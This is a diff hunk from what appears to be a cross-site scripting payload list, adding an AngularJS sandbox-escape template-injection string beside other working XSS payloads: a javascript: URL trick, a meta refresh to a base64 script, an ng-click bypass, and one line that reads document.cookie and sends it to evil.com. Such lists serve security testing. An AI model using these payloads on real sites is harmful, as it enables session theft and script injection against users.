@@ -2207,3 +2207,4 @@ location='javascript://\u2028alert(1)';
 <meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
 \"};with(window){onload=function(){ with(document){k=cookie;};with(window){location='http://evil.com/?a=test'%2bk;};}}//;
 <h1 _-_-_-ng_-_-_click="$event.view.location.replace('javascript:alert(1)')">XSS</h1>
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
